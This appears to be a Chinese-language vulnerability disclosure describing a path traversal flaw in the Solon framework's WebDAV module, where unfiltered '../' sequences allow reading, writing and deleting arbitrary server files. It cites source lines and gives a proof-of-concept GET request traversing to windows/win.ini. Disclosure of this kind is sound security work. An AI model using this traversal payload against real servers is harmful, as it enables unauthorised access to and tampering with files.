# Solon WebDAV 任意文件读取漏洞报告

## 漏洞描述

Solon 框架的 `solon-web-webdav` 模块提供了 WebDAV 文件系统支持。`LocalFileSystem` 实现中的 `realPath()` 方法直接将用户可控的路径参数与根路径拼接，未对 `../` 进行任何过滤。攻击者可通过路径遍历读取、写入和删除服务器上的任意文件。

---

## 影响版本

Solon 框架[Solon v4.0.4](https://gitee.com/opensolon/solon/releases/tag/v4.0.4)  最新版

（所有使用 solon-web-webdav 模块的版本）

---

## 利用条件

- 应用使用了 `solon-web-webdav` 模块
- WebDAV 端点暴露在外

---

## 漏洞复现

**文件路径**：`solon-projects/solon-web/solon-web-webdav/src/main/java/org/noear/solon/web/webdav/impl/LocalFileSystem.java`
**行号**：47-52

直接拼接路径，无任何 ../ 过滤

![image-20260803231237499](https://github.com/fangtang7/picx-images-hosting/raw/master/Solon/image-20260803231237499.6po824pc0v.webp)

行号: 89-96 — fileInfo() 方法接收用户请求的路径

![image-20260803231339483](https://github.com/fangtang7/picx-images-hosting/raw/master/Solon/image-20260803231339483.5flavt81vd.webp)

行号: 129-131 — FileUtil.getInputStream() 读取文件并返回流

![image-20260803231432875](https://github.com/fangtang7/picx-images-hosting/raw/master/Solon/image-20260803231432875.7p4bfatagn.webp)

**请求包**：

```
GET /../../../../../../../../windows/win.ini HTTP/1.1
Host: localhost:8085
Connection: keep-alive
```

![image-20260803231510669]([C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803231510669.png](https://github.com/fangtang7/picx-images-hosting/raw/master/Solon/image-20260803231510669.icu1yv8oj.webp))
